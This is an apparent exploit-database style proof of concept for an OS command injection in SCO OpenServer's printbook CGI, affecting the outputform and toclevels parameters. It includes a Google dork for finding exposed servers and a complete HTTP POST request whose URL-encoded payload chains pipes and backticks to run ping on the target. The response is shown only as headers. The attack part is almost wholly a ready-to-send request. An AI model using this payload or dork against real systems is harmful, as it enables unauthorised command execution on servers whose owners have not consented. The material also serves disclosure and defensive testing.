# Exploit Title: SCO Openserver OS Command Injection Vulnerability
# Google Dork: inurl:/cgi-bin/manlist?section
# Discovered Date: 04/09/2020
# Author: Ramikan
# Vendor Homepage: https://www.xinuos.com/products/
# Software Link: https://www.sco.com/products/openserver507/-overview
# Affected Version: Tested on 5.0.7, 6 can be affected on other versions.
# Tested on: SCO Openserver 5.0.7 & version 6
# CVE : 
# CVSS v3.1: 8.6 ( AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N)
# Category: Web Apps
# Reference : www.fact-in-hack.blogspot.com

*************************************************************************************************************************************

Vulnerability :OS Command Injection

*************************************************************************************************************************************

Affected URL:http://host:8457/cgi-bin/printbook
Affected Paramenter: outputform, toclevels

*************************************************************************************************************************************
POC

*************************************************************************************************************************************
Request:
*************************************************************************************************************************************
POST /cgi-bin/printbook HTTP/1.1
Host: 10.0.0.45:8457
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.0.0.45:8457/en/Navpages/printmap.html
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

outputform=ps%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1&booktitle=test&toclevels=3&part=%2Fen%2FOSR_FEATS%2FCONTENTS.html&part=%2Fen%2FUSE_oview%2FCONTENTS.

*************************************************************************************************************************************
Response:
*************************************************************************************************************************************

HTTP/1.1 200 OK
Date: Tue, 04 Sep 2020 11:17:52 GMT
Server: Apache/1.3.33 (Unix) mod_perl/1.29
Connection: close
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 3188

